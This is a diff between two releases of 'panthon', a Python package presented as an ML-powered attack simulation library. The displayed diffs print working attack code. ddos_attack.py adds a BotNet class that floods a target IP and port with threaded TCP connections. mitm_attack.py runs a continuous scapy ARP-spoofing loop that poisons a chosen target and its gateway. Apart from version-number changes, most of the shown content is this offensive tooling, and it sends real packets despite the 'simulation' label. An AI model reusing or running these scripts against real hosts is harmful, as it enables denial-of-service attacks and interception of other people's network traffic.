# Comparing `tmp/panthon-0.1.2.tar.gz` & `tmp/panthon-0.1.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "panthon-0.1.2.tar", last modified: Thu Jul 27 17:57:22 2023, max compression
+gzip compressed data, was "panthon-0.1.3.tar", last modified: Fri Jul 28 17:33:59 2023, max compression
```

## Comparing `panthon-0.1.2.tar` & `panthon-0.1.3.tar`

### file list

```diff
@@ -1,22 +1,24 @@
-drwxr-xr-x   0 nripeshniketan   (501) staff       (20)        0 2023-07-27 17:57:22.142251 panthon-0.1.2/
--rw-r--r--   0 nripeshniketan   (501) staff       (20)     1072 2023-07-23 10:41:07.000000 panthon-0.1.2/LICENSE
--rw-r--r--   0 nripeshniketan   (501) staff       (20)      700 2023-07-27 17:57:22.142116 panthon-0.1.2/PKG-INFO
--rw-r--r--   0 nripeshniketan   (501) staff       (20)     1041 2023-07-27 17:32:12.000000 panthon-0.1.2/README.md
-drwxr-xr-x   0 nripeshniketan   (501) staff       (20)        0 2023-07-27 17:57:22.140767 panthon-0.1.2/panthon.egg-info/
--rw-r--r--   0 nripeshniketan   (501) staff       (20)      700 2023-07-27 17:57:22.000000 panthon-0.1.2/panthon.egg-info/PKG-INFO
--rw-r--r--   0 nripeshniketan   (501) staff       (20)      353 2023-07-27 17:57:22.000000 panthon-0.1.2/panthon.egg-info/SOURCES.txt
--rw-r--r--   0 nripeshniketan   (501) staff       (20)        1 2023-07-27 17:57:22.000000 panthon-0.1.2/panthon.egg-info/dependency_links.txt
--rw-r--r--   0 nripeshniketan   (501) staff       (20)       22 2023-07-27 17:57:22.000000 panthon-0.1.2/panthon.egg-info/requires.txt
--rw-r--r--   0 nripeshniketan   (501) staff       (20)        4 2023-07-27 17:57:22.000000 panthon-0.1.2/panthon.egg-info/top_level.txt
--rw-r--r--   0 nripeshniketan   (501) staff       (20)       38 2023-07-27 17:57:22.142305 panthon-0.1.2/setup.cfg
--rw-r--r--   0 nripeshniketan   (501) staff       (20)     1065 2023-07-27 17:56:46.000000 panthon-0.1.2/setup.py
-drwxr-xr-x   0 nripeshniketan   (501) staff       (20)        0 2023-07-27 17:57:22.141620 panthon-0.1.2/src/
--rw-r--r--   0 nripeshniketan   (501) staff       (20)      205 2023-07-27 12:21:02.000000 panthon-0.1.2/src/__init__.py
--rw-r--r--   0 nripeshniketan   (501) staff       (20)     1521 2023-07-27 12:21:21.000000 panthon-0.1.2/src/ddos_attack.py
--rw-r--r--   0 nripeshniketan   (501) staff       (20)     1391 2023-07-27 12:21:17.000000 panthon-0.1.2/src/dos_attack.py
--rw-r--r--   0 nripeshniketan   (501) staff       (20)     2065 2023-07-27 17:45:54.000000 panthon-0.1.2/src/mitm_attack.py
--rw-r--r--   0 nripeshniketan   (501) staff       (20)      392 2023-07-27 11:39:03.000000 panthon-0.1.2/src/random_string_generator.py
--rw-r--r--   0 nripeshniketan   (501) staff       (20)      486 2023-07-27 12:07:07.000000 panthon-0.1.2/src/sql_injection.py
-drwxr-xr-x   0 nripeshniketan   (501) staff       (20)        0 2023-07-27 17:57:22.141917 panthon-0.1.2/test/
--rw-r--r--   0 nripeshniketan   (501) staff       (20)      443 2023-07-23 11:45:30.000000 panthon-0.1.2/test/test_ddos_attack.py
--rw-r--r--   0 nripeshniketan   (501) staff       (20)     1542 2023-07-23 15:46:37.000000 panthon-0.1.2/test/test_dos_attack.py
+drwxr-xr-x   0 nripeshniketan   (501) staff       (20)        0 2023-07-28 17:33:59.488573 panthon-0.1.3/
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     1072 2023-07-23 10:41:07.000000 panthon-0.1.3/LICENSE
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)      700 2023-07-28 17:33:59.488369 panthon-0.1.3/PKG-INFO
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     1041 2023-07-27 17:32:12.000000 panthon-0.1.3/README.md
+drwxr-xr-x   0 nripeshniketan   (501) staff       (20)        0 2023-07-28 17:33:59.487017 panthon-0.1.3/panthon.egg-info/
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)      700 2023-07-28 17:33:59.000000 panthon-0.1.3/panthon.egg-info/PKG-INFO
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)      390 2023-07-28 17:33:59.000000 panthon-0.1.3/panthon.egg-info/SOURCES.txt
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)        1 2023-07-28 17:33:59.000000 panthon-0.1.3/panthon.egg-info/dependency_links.txt
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)       26 2023-07-28 17:33:59.000000 panthon-0.1.3/panthon.egg-info/requires.txt
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)        4 2023-07-28 17:33:59.000000 panthon-0.1.3/panthon.egg-info/top_level.txt
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)       38 2023-07-28 17:33:59.488613 panthon-0.1.3/setup.cfg
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     1065 2023-07-28 17:32:35.000000 panthon-0.1.3/setup.py
+drwxr-xr-x   0 nripeshniketan   (501) staff       (20)        0 2023-07-28 17:33:59.487945 panthon-0.1.3/src/
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)      281 2023-07-28 17:25:45.000000 panthon-0.1.3/src/__init__.py
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     2157 2023-07-28 17:26:05.000000 panthon-0.1.3/src/ddos_attack.py
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     1926 2023-07-28 17:27:49.000000 panthon-0.1.3/src/dns_spoofer.py
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     2817 2023-07-28 16:57:13.000000 panthon-0.1.3/src/dos_attack.py
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     2217 2023-07-28 06:18:25.000000 panthon-0.1.3/src/mitm_attack.py
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)      392 2023-07-27 11:39:03.000000 panthon-0.1.3/src/random_string_generator.py
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     2057 2023-07-28 07:06:50.000000 panthon-0.1.3/src/sql_injection.py
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     2681 2023-07-28 17:13:13.000000 panthon-0.1.3/src/xss_attack.py
+drwxr-xr-x   0 nripeshniketan   (501) staff       (20)        0 2023-07-28 17:33:59.488200 panthon-0.1.3/test/
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)      443 2023-07-23 11:45:30.000000 panthon-0.1.3/test/test_ddos_attack.py
+-rw-r--r--   0 nripeshniketan   (501) staff       (20)     1542 2023-07-23 15:46:37.000000 panthon-0.1.3/test/test_dos_attack.py
```

### Comparing `panthon-0.1.2/LICENSE` & `panthon-0.1.3/LICENSE`

 * *Files identical despite different names*

### Comparing `panthon-0.1.2/PKG-INFO` & `panthon-0.1.3/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: panthon
-Version: 0.1.2
+Version: 0.1.3
 Summary: A Machine Learning-powered Cybersecurity Attack Simulation Library
 Home-page: https://github.com/nripeshn/panthon
 Author: Nripesh Niketan
 Author-email: nripesh14@gmail.com
 Classifier: Development Status :: 3 - Alpha
 Classifier: Intended Audience :: Developers
 Classifier: Topic :: Software Development :: Build Tools
```

### Comparing `panthon-0.1.2/README.md` & `panthon-0.1.3/README.md`

 * *Files identical despite different names*

### Comparing `panthon-0.1.2/panthon.egg-info/PKG-INFO` & `panthon-0.1.3/panthon.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: panthon
-Version: 0.1.2
+Version: 0.1.3
 Summary: A Machine Learning-powered Cybersecurity Attack Simulation Library
 Home-page: https://github.com/nripeshn/panthon
 Author: Nripesh Niketan
 Author-email: nripesh14@gmail.com
 Classifier: Development Status :: 3 - Alpha
 Classifier: Intended Audience :: Developers
 Classifier: Topic :: Software Development :: Build Tools
```

### Comparing `panthon-0.1.2/setup.py` & `panthon-0.1.3/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -5,15 +5,15 @@
 
 # Read in requirements.txt with specified encoding
 with open('requirements.txt', 'r', encoding='utf-8') as f:
     requirements = f.read().splitlines()
 
 setup(
     name='panthon',
-    version='0.1.2',
+    version='0.1.3',
     url='https://github.com/nripeshn/panthon',
     author='Nripesh Niketan',
     author_email='nripesh14@gmail.com',
     description='A Machine Learning-powered Cybersecurity Attack Simulation Library',
     packages=find_packages(),
     install_requires=requirements,
     classifiers=[
```

### Comparing `panthon-0.1.2/src/ddos_attack.py` & `panthon-0.1.3/src/ddos_attack.py`

 * *Files 16% similar despite different names*

```diff
@@ -1,12 +1,18 @@
 import torch
 import torch.nn as nn
 import socket
 import threading
 from .random_string_generator import RandomStringGenerator
+import logging
+import random
+
+logging.basicConfig(
+    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
+)
 
 
 class DDoSAttack:
     def __init__(self, target_ip, target_port, num_connections):
         self.target_ip = target_ip
         self.target_port = target_port
         self.num_connections = num_connections
@@ -17,29 +23,48 @@
         for _ in range(self.num_connections):
             thread = threading.Thread(target=self.create_connection)
             self.threads.append(thread)
             thread.start()
 
     def create_connection(self):
         try:
-            # In a real DDoS attack, connections would be distributed over multiple IPs
-            # However, in this simulation we are only using a single machine
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((self.target_ip, self.target_port))
             payload = self.model(torch.tensor([])).encode()  # Generate payload
             sock.send(payload)
+            logging.info("Payload sent.")
             sock.send(b"QUIT")
             sock.close()
         except Exception as e:
-            print(f"Exception occurred while creating a connection: {e}")
+            logging.error(f"Exception occurred while creating a connection: {e}")
 
     def wait_for_threads(self):
         for thread in self.threads:
             thread.join()
 
 
+class BotNet:
+    def __init__(self, num_bots, target_ip, target_port, num_connections):
+        self.num_bots = num_bots
+        self.target_ip = target_ip
+        self.target_port = target_port
+        self.num_connections = num_connections
+        self.bots = []
+
+    def create_bots(self):
+        for _ in range(self.num_bots):
+            bot = DDoSAttack(self.target_ip, self.target_port, self.num_connections)
+            self.bots.append(bot)
+
+    def launch_attack(self):
+        for bot in self.bots:
+            bot.simulate_attack()
+        for bot in self.bots:
+            bot.wait_for_threads()
+
+
 if __name__ == "__main__":
-    ddos = DDoSAttack(
-        "192.168.1.1", 80, 500
-    )  # target IP, target port, number of connections
-    ddos.simulate_attack()
-    ddos.wait_for_threads()
+    botnet = BotNet(
+        10, "192.168.1.1", 80, 100
+    )  # num of bots, target IP, target port, connections per bot
+    botnet.create_bots()
+    botnet.launch_attack()
```

### Comparing `panthon-0.1.2/src/mitm_attack.py` & `panthon-0.1.3/src/mitm_attack.py`

 * *Files 22% similar despite different names*

```diff
@@ -1,10 +1,16 @@
 import netifaces
 import ipaddress
 from scapy.all import ARP, Ether, sendp
+import logging
+import time
+
+logging.basicConfig(
+    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
+)
 
 
 class MITMAttack:
     def __init__(self, target_ip, gateway_ip, interface):
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
         self.interface = interface
@@ -32,29 +38,29 @@
         arp_response_target = self._create_arp_response(
             self.gateway_ip, self.target_ip, self.broadcast
         )
         arp_response_gateway = self._create_arp_response(
             self.target_ip, self.gateway_ip, self.broadcast
         )
 
-        print("MITM Running... Press Ctrl+C to stop the attack.")
-
+        logging.info("MITM Running... Press Ctrl+C to stop the attack.")
         try:
             while True:
                 sendp(arp_response_target, iface=self.interface)
                 sendp(arp_response_gateway, iface=self.interface)
+                time.sleep(2)  # Add sleep to prevent overloading the network
         except KeyboardInterrupt:
-            print("\nMITM Attack Stopped.")
+            logging.info("\nMITM Attack Stopped.")
 
 
 if __name__ == "__main__":
-    # Interface could be something like 'eth0' or 'wlan0' on Linux, 'Wi-Fi' on Windows, etc.
-    interface = input("Enter the interface name: ")  
-
+    interface = input("Enter the interface name: ")
     target_ip = input("Enter the target IP address: ")
     gateway_ip = input("Enter the gateway IP address: ")
 
     try:
-        mitm = MITMAttack(target_ip=target_ip, gateway_ip=gateway_ip, interface=interface)
+        mitm = MITMAttack(
+            target_ip=target_ip, gateway_ip=gateway_ip, interface=interface
+        )
         mitm.run_attack()
     except ValueError as e:
-        print(e)
+        logging.error(e)
```

### Comparing `panthon-0.1.2/test/test_dos_attack.py` & `panthon-0.1.3/test/test_dos_attack.py`

 * *Files identical despite different names*

